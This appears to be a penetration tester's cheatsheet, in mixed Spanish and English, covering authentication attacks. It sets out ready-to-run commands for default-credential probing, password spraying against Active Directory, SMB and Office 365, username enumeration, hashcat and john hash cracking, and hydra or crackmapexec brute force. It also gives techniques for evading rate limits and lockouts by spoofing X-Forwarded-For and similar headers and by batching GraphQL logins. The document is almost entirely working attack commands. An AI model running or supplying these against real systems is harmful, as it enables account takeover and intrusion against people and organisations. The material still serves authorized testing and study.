---
aliases:
  - Password Spraying
  - Credential Stuffing
  - Hashcat Auth
  - Hydra
tags:
  - type/cheatsheet
  - vuln/auth-bypass
  - technique/credential-access
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Authentication & Authorization Bypass]]'
  - '[[hashcat]]'
  - '[[john]]'
  - '[[Hydra]]'
---
# Auth Bypass - Brute Force y Credential Stuffing

***

## Default Credential Wordlists

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `ls /usr/share/seclists/Passwords/Default-Credentials/` | Lista SecLists curated por vendor | Foundation. |
| `cat /usr/share/seclists/Passwords/Default-Credentials/default-router-passwords.txt` | Router/network gear defaults | Network appliances. |
| `wget https://wordlists-cdn.assetnote.io/data/automated/2022_default-credentials.txt` | Assetnote curated modern | Maintained. |
| `nmap --script=*-default-accounts -p 80,443 target` | NSE default account scripts | Per-service. |
| `nuclei -t http/default-logins/ -u https://target/` | nuclei templates default-login | Auto-detection. |
| `hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt target https-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"` | Bulk default cred probe | Standard. |
| `git clone https://github.com/iotpolice/iot_default_passwords` | IoT-focused defaults | IoT target. |
^auth-brute-defaults

___

## Password Spraying

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `kerbrute passwordspray -d target.local users.txt 'Spring2025!'` | AD password spray con kerbrute | Kerberos auth. |
| `crackmapexec smb target -u users.txt -p 'Welcome1' --continue-on-success` | SMB password spray | Windows network. |
| `MSOLSpray --userlist users.txt --password 'Spring2025!'` | O365/Azure AD spray | Microsoft cloud. |
| `o365spray --spray --user users.txt --password 'Welcome1' --domain target.com` | Alt O365 spray tool | M365. |
| `kerbrute userenum -d target.local users.txt` | Pre-spray username enum | Pre-attack. |
| `hydra -L users.txt -p 'Spring2025!' https-post-form '/login:user=^USER^&pass=^PASS^:F=Invalid' target` | Hydra spray single pass × N users | Web-based. |
| `for u in $(cat users.txt); do curl -s -d "user=$u&pass=Spring2025!" https://target/login \| grep -i success; done` | Bash manual spray | Quick + flexible. |
| Throttle: `--threads 1 --jitter 5s` (kerbrute) | Slow distribuído | Avoid lockout. |
^auth-brute-spraying

___

## Username Enum + Targeted Brute

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -d "user=admin&pass=fake" https://target/login` vs `curl -d "user=nonexistent&pass=fake" https://target/login` y diff timing/response | Username enum via response differential | Detection. |
| `kerbrute userenum -d target.local /usr/share/seclists/Usernames/Names/names.txt` | AD user enum via Kerberos | AD-specific. |
| `curl -X POST -d "email=victim@target.com" https://target/forgot \| grep -i "user not found"` | User enum via reset endpoint | Common bug. |
| `hydra -l victim -P /usr/share/wordlists/rockyou.txt target https-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"` | Targeted single-user brute | Post-enum. |
| `hashcat -m 1000 -a 0 hash.txt rockyou.txt -r best64.rule --username` | username-aware hash crack | Combo offline. |
| `theHarvester -d target.com -b linkedin,google` | OSINT username discovery | Pre-attack. |
| `curl https://api.haveibeenpwned.com/breachedaccount/victim@target.com` (con API key) | Check breached creds | Pre-spray. |
| `grep -i 'victim@target.com' breach.txt` | Local breach DB lookup | Stuffing prep. |
^auth-brute-targeted

___

## Offline Crack (Hashcat / John)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `hashid hash.txt` o `hashcat --identify hash.txt` | Identify hash type | Pre-crack. |
| `hashcat -m 0 hash.txt rockyou.txt` | MD5 crack | Fast hash. |
| `hashcat -m 100 hash.txt rockyou.txt` | SHA1 crack | Same. |
| `hashcat -m 1400 hash.txt rockyou.txt -r best64.rule` | SHA256 con mutations | Modern hash. |
| `hashcat -m 3200 hash.txt rockyou.txt` | bcrypt crack | Slow algorithm — small wordlist. |
| `hashcat -m 1000 hash.txt rockyou.txt` | NTLM (Windows) | AD hashes. |
| `hashcat -m 5600 hash.txt rockyou.txt` | NetNTLMv2 captured (Responder) | Network capture. |
| `hashcat -m 18200 hash.txt rockyou.txt` | Kerberos AS-REP roastable | AS-REP roasting. |
| `hashcat -m 13100 hash.txt rockyou.txt` | Kerberos TGS-REP (Kerberoast) | Kerberoasting. |
| `hashcat -m 1800 hash.txt rockyou.txt` | SHA512(Unix) `/etc/shadow` | Linux. |
| `hashcat -m 16500 jwt.txt rockyou.txt` | JWT HS256 secret crack | JWT context. |
| `hashcat -m <mode> -a 3 hash.txt ?l?l?l?l?l?l?l?l` | Mask attack 8 chars lowercase | Sin wordlist. |
| `hashcat -m <mode> -a 6 hash.txt rockyou.txt ?d?d?d?d` | Hybrid wordlist + 4 dígitos | Common pattern. |
| `john --wordlist=rockyou.txt --format=NT hash.txt` | John alternative CPU | Sin GPU. |
| `hashcat -m <mode> hash.txt --show` | Ver cracked previo | Post-run. |
^auth-brute-hashcat

___

## Online (Hydra / Medusa / Crackmapexec)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `hydra -L users.txt -P passes.txt target https-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"` | HTTP form brute | Web-based. |
| `hydra -L users.txt -P passes.txt -m / target https-get` | HTTP Basic auth brute | Basic auth. |
| `hydra -L users.txt -P passes.txt ssh://target` | SSH brute | Network. |
| `hydra -L users.txt -P passes.txt ftp://target` | FTP brute | Network. |
| `hydra -L users.txt -P passes.txt smb://target` | SMB brute | Windows. |
| `medusa -h target -U users.txt -P passes.txt -M http` | Medusa alternative | Alt to Hydra. |
| `patator http_fuzz url=https://target/login method=POST body='user=COMBO00&pass=COMBO01' 0=combos.txt -x 'ignore:code=401'` | Patator modern Python | Flexible. |
| `ffuf -w pass.txt -X POST -u 'https://target/login' -d 'user=admin&pass=FUZZ' -fc 401` | ffuf-based brute | Modern fuzzer. |
| `crackmapexec smb target -u admin -p passes.txt --continue-on-success` | SMB brute multi-pass | CME multi-protocol. |
| `crackmapexec winrm target -u users.txt -p passes.txt` | WinRM brute | Lateral. |
| Burp Intruder → Sniper con position en password | UI-based brute | GUI workflow. |
^auth-brute-online

___

## Bypass Rate Limiting / Lockout

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Burp Repeater group `POST /login {user, pass}` × 50 single conn HTTP/2 | Single-packet race rate limit bypass | HTTP/2 endpoints. |
| `for ip in 1.1.1.1 8.8.8.8 9.9.9.9 ...; do curl -H "X-Forwarded-For: $ip" -d "user=admin&pass=$P" https://target/login; done` | XFF spoof rate limit bypass | Server trust XFF. |
| `curl -H "X-Real-IP: 127.0.0.1" -d "user=admin&pass=$P" https://target/login` | IP spoof variant | nginx-fronted. |
| `curl -H "Cf-Connecting-IP: $RANDOM" ...` (rotate per attempt) | Cloudflare IP spoof | CF no strip. |
| `curl -d "user=admin&pass=$P" -c /dev/null https://target/login` (sin cookie persistence) | Cookie-clear rate limit reset | Per-session limit. |
| `for ua in 'Mozilla' 'Chrome' 'curl' 'PostmanRuntime'; do curl -A "$ua" ...; done` | User-Agent rotation | Per-UA limit. |
| GraphQL batching: `[{"query":"mutation{login(u:\"a\",p:\"1\")}"},...,{"query":"mutation{login(u:\"a\",p:\"N\")}"}]` | Bulk login en single request | GraphQL endpoint. |
| `curl https://target/api/v1/login -d "..."` vs `https://target/api/v2/login -d "..."` | Version differential limits | Per-endpoint limit. |
| `curl -X POST -H "Content-Type: multipart/form-data" -F "user=admin" -F "pass=$P" https://target/login` | Multipart vs JSON differential | Content-Type differential. |
| `curl https://m.target.com/api/login -d "..."` (mobile endpoint) | Mobile API less restrictive | Edge bypass. |
| `python3 turbo_intruder_script.py` con `concurrentConnections=1, requestsPerConnection=100` | Volume single-packet attack | Turbo Intruder. |
^auth-brute-bypass

***
